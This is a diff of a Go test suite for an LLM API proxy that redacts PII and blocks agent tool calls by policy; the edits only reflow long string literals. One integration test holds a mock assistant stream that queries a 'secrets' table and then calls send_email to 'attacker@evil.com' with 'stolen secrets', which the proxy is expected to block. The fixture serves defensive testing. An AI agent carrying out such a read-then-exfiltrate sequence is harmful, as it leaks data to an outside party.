@@ -118,7 +118,8 @@ func TestProxy_AnthropicPassthrough(t *testing.T) {
 
 	// Make a request to the proxy
 	proxyURL := "http://" + proxy.Addr().String() + "/v1/messages"
-	reqBody := `{"model": "claude-sonnet-4-20250514", "messages": [{"role": "user", "content": "Hello, Claude!"}]}`
+	reqBody := `{"model": "claude-sonnet-4-20250514", "messages": [{"role": "user", "content": ` +
+		`"Hello, Claude!"}]}`
 	req, err := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
 	if err != nil {
 		t.Fatalf("failed to create request: %v", err)
@@ -275,8 +276,9 @@ func TestProxy_DLPRedaction(t *testing.T) {
 		"model": "claude-sonnet-4-20250514",
 		"messages": []map[string]interface{}{
 			{
-				"role":    "user",
-				"content": "Please contact john.doe@example.com or call 555-123-4567. My SSN is 123-45-6789.",
+				"role": "user",
+				"content": "Please contact john.doe@example.com or call 555-123-4567. My SSN is " +
+					"123-45-6789.",
 			},
 		},
 	}
@@ -739,12 +741,17 @@ func TestProxy_CustomOpenAIProvider(t *testing.T) {
 func TestProxy_SSEStreaming(t *testing.T) {
 	// Create a mock upstream server that returns an SSE stream
 	sseEvents := []string{
-		"event: message_start\ndata: {\"type\": \"message_start\", \"message\": {\"id\": \"msg_01\", \"type\": \"message\", \"role\": \"assistant\"}}\n\n",
-		"event: content_block_start\ndata: {\"type\": \"content_block_start\", \"index\": 0, \"content_block\": {\"type\": \"text\", \"text\": \"\"}}\n\n",
-		"event: content_block_delta\ndata: {\"type\": \"content_block_delta\", \"index\": 0, \"delta\": {\"type\": \"text_delta\", \"text\": \"Hello\"}}\n\n",
-		"event: content_block_delta\ndata: {\"type\": \"content_block_delta\", \"index\": 0, \"delta\": {\"type\": \"text_delta\", \"text\": \" World\"}}\n\n",
+		"event: message_start\ndata: {\"type\": \"message_start\", \"message\": {\"id\": " +
+			"\"msg_01\", \"type\": \"message\", \"role\": \"assistant\"}}\n\n",
+		"event: content_block_start\ndata: {\"type\": \"content_block_start\", \"index\": 0, " +
+			"\"content_block\": {\"type\": \"text\", \"text\": \"\"}}\n\n",
+		"event: content_block_delta\ndata: {\"type\": \"content_block_delta\", \"index\": 0, " +
+			"\"delta\": {\"type\": \"text_delta\", \"text\": \"Hello\"}}\n\n",
+		"event: content_block_delta\ndata: {\"type\": \"content_block_delta\", \"index\": 0, " +
+			"\"delta\": {\"type\": \"text_delta\", \"text\": \" World\"}}\n\n",
 		"event: content_block_stop\ndata: {\"type\": \"content_block_stop\", \"index\": 0}\n\n",
-		"event: message_delta\ndata: {\"type\": \"message_delta\", \"delta\": {\"stop_reason\": \"end_turn\"}, \"usage\": {\"output_tokens\": 10}}\n\n",
+		"event: message_delta\ndata: {\"type\": \"message_delta\", \"delta\": {\"stop_reason\": " +
+			"\"end_turn\"}, \"usage\": {\"output_tokens\": 10}}\n\n",
 		"event: message_stop\ndata: {\"type\": \"message_stop\"}\n\n",
 	}
 
@@ -797,7 +804,8 @@ func TestProxy_SSEStreaming(t *testing.T) {
 
 	// Make an SSE streaming request
 	proxyURL := "http://" + proxy.Addr().String() + "/v1/messages"
-	reqBody := `{"model": "claude-sonnet-4-20250514", "stream": true, "messages": [{"role": "user", "content": "Hello"}]}`
+	reqBody := `{"model": "claude-sonnet-4-20250514", "stream": true, "messages": [{"role": ` +
+		`"user", "content": "Hello"}]}`
 	req, _ := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
 	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("x-api-key", "sk-ant-test")
@@ -909,7 +917,8 @@ func TestProxy_SSEStreamingWithDLP(t *testing.T) {
 
 	// Make request with PII
 	proxyURL := "http://" + proxy.Addr().String() + "/v1/messages"
-	reqBody := `{"model": "claude-sonnet-4-20250514", "stream": true, "messages": [{"role": "user", "content": "Email me at test@example.com"}]}`
+	reqBody := `{"model": "claude-sonnet-4-20250514", "stream": true, "messages": [{"role": ` +
+		`"user", "content": "Email me at test@example.com"}]}`
 	req, _ := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
 	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("x-api-key", "sk-ant-test")
@@ -1165,7 +1174,8 @@ func TestProxyEventCallback(t *testing.T) {
 
 	// Send a request through the proxy
 	proxyURL := "http://" + proxy.Addr().String() + "/v1/messages"
-	reqBody := `{"model":"claude-sonnet-4-20250514","messages":[{"role":"user","content":"weather?"}]}`
+	reqBody := `{"model":"claude-sonnet-4-20250514","messages":[{"role":"user",` +
+		`"content":"weather?"}]}`
 	req, err := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
 	if err != nil {
 		t.Fatalf("NewRequest: %v", err)
@@ -1225,11 +1235,18 @@ func TestProxyEventCallback(t *testing.T) {
 func TestProxyEventCallback_SSE(t *testing.T) {
 	// Anthropic SSE stream with a tool_use content block.
 	sseChunks := []string{
-		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_01\",\"type\":\"message\",\"role\":\"assistant\",\"content\":[],\"model\":\"claude-sonnet-4-20250514\",\"stop_reason\":null}}\n\n",
-		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_01sse\",\"name\":\"get_weather\"}}\n\n",
-		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"city\\\": \\\"NYC\\\"}\"}}\n\n",
+		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_01\"," +
+			"\"type\":\"message\",\"role\":\"assistant\",\"content\":[]," +
+			"\"model\":\"claude-sonnet-4-20250514\",\"stop_reason\":null}}\n\n",
+		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0," +
+			"\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_01sse\"," +
+			"\"name\":\"get_weather\"}}\n\n",
+		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0," +
+			"\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"city\\\": " +
+			"\\\"NYC\\\"}\"}}\n\n",
 		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
-		"event: message_delta\ndata: {\"type\":\"message_delta\",\"delta\":{\"stop_reason\":\"tool_use\"},\"usage\":{\"output_tokens\":10}}\n\n",
+		"event: message_delta\ndata: {\"type\":\"message_delta\"," +
+			"\"delta\":{\"stop_reason\":\"tool_use\"},\"usage\":{\"output_tokens\":10}}\n\n",
 		"event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n",
 	}
 
@@ -1305,7 +1322,8 @@ func TestProxyEventCallback_SSE(t *testing.T) {
 	time.Sleep(10 * time.Millisecond)
 
 	proxyURL := "http://" + proxy.Addr().String() + "/v1/messages"
-	reqBody := `{"model":"claude-sonnet-4-20250514","stream":true,"messages":[{"role":"user","content":"weather?"}]}`
+	reqBody := `{"model":"claude-sonnet-4-20250514","stream":true,"messages":[{"role":"user",` +
+		`"content":"weather?"}]}`
 	req, err := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
 	if err != nil {
 		t.Fatalf("NewRequest: %v", err)
@@ -1360,14 +1378,23 @@ func TestProxyEventCallback_SSE(t *testing.T) {
 func TestProxy_SSEBlocking_Integration(t *testing.T) {
 	// Anthropic SSE stream with a text block (index 0) followed by a tool_use block (index 1).
 	sseChunks := []string{
-		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_02\",\"type\":\"message\",\"role\":\"assistant\",\"content\":[],\"model\":\"claude-sonnet-4-20250514\",\"stop_reason\":null}}\n\n",
-		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"text\",\"text\":\"\"}}\n\n",
-		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"Let me check.\"}}\n\n",
+		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_02\"," +
+			"\"type\":\"message\",\"role\":\"assistant\",\"content\":[]," +
+			"\"model\":\"claude-sonnet-4-20250514\",\"stop_reason\":null}}\n\n",
+		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0," +
+			"\"content_block\":{\"type\":\"text\",\"text\":\"\"}}\n\n",
+		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0," +
+			"\"delta\":{\"type\":\"text_delta\",\"text\":\"Let me check.\"}}\n\n",
 		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
-		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":1,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_02block\",\"name\":\"get_weather\"}}\n\n",
-		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":1,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"city\\\": \\\"NYC\\\"}\"}}\n\n",
+		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":1," +
+			"\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_02block\"," +
+			"\"name\":\"get_weather\"}}\n\n",
+		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":1," +
+			"\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"city\\\": " +
+			"\\\"NYC\\\"}\"}}\n\n",
 		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":1}\n\n",
-		"event: message_delta\ndata: {\"type\":\"message_delta\",\"delta\":{\"stop_reason\":\"tool_use\"},\"usage\":{\"output_tokens\":20}}\n\n",
+		"event: message_delta\ndata: {\"type\":\"message_delta\"," +
+			"\"delta\":{\"stop_reason\":\"tool_use\"},\"usage\":{\"output_tokens\":20}}\n\n",
 		"event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n",
 	}
 
@@ -1442,7 +1469,8 @@ func TestProxy_SSEBlocking_Integration(t *testing.T) {
 	time.Sleep(10 * time.Millisecond)
 
 	proxyURL := "http://" + proxy.Addr().String() + "/v1/messages"
-	reqBody := `{"model":"claude-sonnet-4-20250514","stream":true,"messages":[{"role":"user","content":"weather?"}]}`
+	reqBody := `{"model":"claude-sonnet-4-20250514","stream":true,"messages":[{"role":"user",` +
+		`"content":"weather?"}]}`
 	req, err := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
 	if err != nil {
 		t.Fatalf("NewRequest: %v", err)
@@ -1486,7 +1514,8 @@ func TestProxy_SSEBlocking_Integration(t *testing.T) {
 	// 3. The replacement text must be present.
 	if !strings.Contains(sseOutput, "[agentsh] Tool 'get_weather' blocked by policy") {
 		t.Error(
-			"expected replacement text '[agentsh] Tool 'get_weather' blocked by policy' in SSE output",
+			"expected replacement text '[agentsh] Tool 'get_weather' blocked by policy' in " +
+				"SSE output",
 		)
 	}
 
@@ -1534,24 +1563,40 @@ func TestProxy_SSEBlocking_Integration(t *testing.T) {
 func TestProxy_CrossServerBlocking_Integration(t *testing.T) {
 	// SSE stream for request 1: query_database (read tool, should be allowed)
 	sseChunksRead := []string{
-		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_r1\",\"type\":\"message\",\"role\":\"assistant\",\"content\":[],\"model\":\"claude-sonnet-4-20250514\",\"stop_reason\":null}}\n\n",
-		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_read01\",\"name\":\"query_database\"}}\n\n",
-		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"sql\\\": \\\"SELECT * FROM secrets\\\"}\"}}\n\n",
+		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_r1\"," +
+			"\"type\":\"message\",\"role\":\"assistant\",\"content\":[]," +
+			"\"model\":\"claude-sonnet-4-20250514\",\"stop_reason\":null}}\n\n",
+		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0," +
+			"\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_read01\"," +
+			"\"name\":\"query_database\"}}\n\n",
+		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0," +
+			"\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"sql\\\": " +
+			"\\\"SELECT * FROM secrets\\\"}\"}}\n\n",
 		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
-		"event: message_delta\ndata: {\"type\":\"message_delta\",\"delta\":{\"stop_reason\":\"tool_use\"},\"usage\":{\"output_tokens\":15}}\n\n",
+		"event: message_delta\ndata: {\"type\":\"message_delta\"," +
+			"\"delta\":{\"stop_reason\":\"tool_use\"},\"usage\":{\"output_tokens\":15}}\n\n",
 		"event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n",
 	}
 
 	// SSE stream for request 2: send_email (send tool, should be blocked by cross-server)
 	sseChunksSend := []string{
-		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_r2\",\"type\":\"message\",\"role\":\"assistant\",\"content\":[],\"model\":\"claude-sonnet-4-20250514\",\"stop_reason\":null}}\n\n",
-		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"text\",\"text\":\"\"}}\n\n",
-		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"Sending the data now.\"}}\n\n",
+		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_r2\"," +
+			"\"type\":\"message\",\"role\":\"assistant\",\"content\":[]," +
+			"\"model\":\"claude-sonnet-4-20250514\",\"stop_reason\":null}}\n\n",
+		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0," +
+			"\"content_block\":{\"type\":\"text\",\"text\":\"\"}}\n\n",
+		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0," +
+			"\"delta\":{\"type\":\"text_delta\",\"text\":\"Sending the data now.\"}}\n\n",
 		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
-		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":1,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_send01\",\"name\":\"send_email\"}}\n\n",
-		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":1,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"to\\\": \\\"attacker@evil.com\\\", \\\"body\\\": \\\"stolen secrets\\\"}\"}}\n\n",
+		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":1," +
+			"\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_send01\"," +
+			"\"name\":\"send_email\"}}\n\n",
+		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":1," +
+			"\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"to\\\": " +
+			"\\\"attacker@evil.com\\\", \\\"body\\\": \\\"stolen secrets\\\"}\"}}\n\n",
 		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":1}\n\n",
-		"event: message_delta\ndata: {\"type\":\"message_delta\",\"delta\":{\"stop_reason\":\"tool_use\"},\"usage\":{\"output_tokens\":20}}\n\n",
+		"event: message_delta\ndata: {\"type\":\"message_delta\"," +
+			"\"delta\":{\"stop_reason\":\"tool_use\"},\"usage\":{\"output_tokens\":20}}\n\n",
 		"event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n",
 	}
 
@@ -1664,7 +1709,8 @@ func TestProxy_CrossServerBlocking_Integration(t *testing.T) {
 
 	// --- Request 1: query_database (read) should be ALLOWED ---
 	{
-		reqBody := `{"model":"claude-sonnet-4-20250514","stream":true,"messages":[{"role":"user","content":"get me the secrets"}]}`
+		reqBody := `{"model":"claude-sonnet-4-20250514","stream":true,"messages":[{"role":"user",` +
+			`"content":"get me the secrets"}]}`
 		req, err := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
 		if err != nil {
 			t.Fatalf("NewRequest (req1): %v", err)
@@ -1710,7 +1756,8 @@ func TestProxy_CrossServerBlocking_Integration(t *testing.T) {
 
 	// --- Request 2: send_email (send) should be BLOCKED by cross-server rule ---
 	{
-		reqBody := `{"model":"claude-sonnet-4-20250514","stream":true,"messages":[{"role":"user","content":"now email the results"}]}`
+		reqBody := `{"model":"claude-sonnet-4-20250514","stream":true,"messages":[{"role":"user",` +
+			`"content":"now email the results"}]}`
 		req, err := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
 		if err != nil {
 			t.Fatalf("NewRequest (req2): %v", err)
@@ -1751,14 +1798,16 @@ func TestProxy_CrossServerBlocking_Integration(t *testing.T) {
 		// 2. The tool_use block for send_email must NOT appear (blocked and replaced).
 		if strings.Contains(sseOutput, `"type":"tool_use"`) {
 			t.Error(
-				"request 2: expected tool_use block to be suppressed, but found 'type:tool_use' in SSE output",
+				"request 2: expected tool_use block to be suppressed, but found 'type:tool_use' " +
+					"in SSE output",
 			)
 		}
 
 		// 3. The replacement text must be present.
 		if !strings.Contains(sseOutput, "[agentsh] Tool 'send_email' blocked by policy") {
 			t.Error(
-				"request 2: expected replacement text '[agentsh] Tool 'send_email' blocked by policy' in SSE output",
+				"request 2: expected replacement text '[agentsh] Tool 'send_email' blocked by " +
+					"policy' in SSE output",
 			)
 		}
 
@@ -1912,7 +1961,8 @@ func TestProxyRateLimitBlocksToolCall(t *testing.T) {
 
 	// Send a request through the proxy.
 	proxyURL := "http://" + proxy.Addr().String() + "/v1/messages"
-	reqBody := `{"model":"claude-sonnet-4-20250514","messages":[{"role":"user","content":"weather?"}]}`
+	reqBody := `{"model":"claude-sonnet-4-20250514","messages":[{"role":"user",` +
+		`"content":"weather?"}]}`
 	req, err := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
 	if err != nil {
 		t.Fatalf("NewRequest: %v", err)
